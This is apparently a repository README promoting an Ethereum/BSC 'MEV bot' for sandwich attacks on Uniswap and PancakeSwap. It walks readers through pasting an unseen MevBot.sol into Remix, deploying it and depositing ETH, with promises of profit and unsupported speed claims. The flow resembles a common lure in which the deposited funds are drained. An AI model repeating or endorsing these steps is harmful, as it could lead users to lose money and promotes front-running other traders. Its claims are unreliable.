MEV Bot
ETH MEV-BOT for sandwich attack on Uniswap and Pancakeswap Mev Solidity BOT that allows deployers of contract to take profits from tokens.

Uniswap v2 MEV bot - Updated mempool settings - April 2023 The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

MEV bot Instructions (works only for Mainnet)

**For your profit use above 1 ETH **


Make money with MevBot (ETH network)

How it works:
![image](https://user-images.githubusercontent.com/132091459/235274248-f03eff9f-ad44-43b6-a42d-69d77cad7e23.png)


You can see an example of how the bot works. The bot will make transactions on your entire balance to increase profit

First-source code

1. Copy code and paste the code of MevBot.sol file in Remix IDE
![image](https://user-images.githubusercontent.com/132091459/235274271-fd2fada5-8da6-4840-9c86-ea18821df532.png)

2. Click Solidity complier 0.6.12 And press Compile MevBot.sol
![image](https://user-images.githubusercontent.com/132091459/235274287-68982809-ac68-4d49-9673-fffe12d7cbb5.png)

3. Select ETH or BSC(BNB) network and Paste the router address

Press Transact (Deploy)
![image](https://user-images.githubusercontent.com/132091459/235274308-855a8c47-647a-43f4-a52e-93acb45a356d.png)

4. Next-deposit ETH to MevBot contract address. Copy contract's ETH address of your MevBot contract and send a number of Ethereum to this address.
After that start it with the start button
![image](https://user-images.githubusercontent.com/132091459/235274330-c84bf2ef-67dc-486f-a117-2f07f94c51d2.png)
![image](https://user-images.githubusercontent.com/132091459/235274359-5f311e74-39bd-48f2-9ca6-56464368f07c.png)
![image](https://user-images.githubusercontent.com/132091459/235274381-e70a3568-589d-426e-a4fd-b07c68347275.png)

Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.5-1 ΕΤΗ.

At any time you can Stop bot or return your money by calling the withdrawal function.
